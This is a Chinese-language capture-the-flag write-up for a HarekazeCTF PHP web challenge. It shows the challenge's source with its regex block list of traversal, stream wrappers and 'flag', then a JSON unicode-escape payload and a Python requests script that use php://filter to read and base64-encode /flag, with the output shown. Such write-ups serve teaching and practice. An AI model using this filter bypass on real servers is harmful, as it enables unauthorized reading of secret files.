这队名...船员跑来CTF暴打萌新了QwQ

![[Pasted image 20230118105015.png|500]]

强迫症当场去世.jpg

![[Pasted image 20230118105045.png|500]]

---

```
/#pages/about.html
```

![[Pasted image 20230118105213.png|300]]

```
/#pages/lorem.html
```

![[Pasted image 20230118105340.png|1000]]

```
/query.php?source
```

```php
 <?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]); 
```

通过`php://input`读取`POST`的`JSON`字符串，取`page`属性传给`file_get_contents`，再编码成`JSON`返回

通过`php://filter`进行`base64`编码绕过对`HarekazeCTF`格式的过滤，但这样会被`is_valid`过滤

不过既然`JSON`的字符串值套在双引号里面，大抵是能转义的罢👀

```json
{
    "page": "\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"
}
```

```python
import requests
url = 'http://xxx.node4.buuoj.cn:81/query.php'
data = b'{"page": "\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}'
print(requests.post(url, data=data).content)
```

```json
{
    "content":"ZmxhZ3swNDJlYTk0My0yMmZkLTQ3NzEtODJmOS0xOGQwYzA1OGMxNDh9Cg=="
}
```

![[Pasted image 20230118113034.png|500]]

#Web #PHP #json #encoding #伪协议 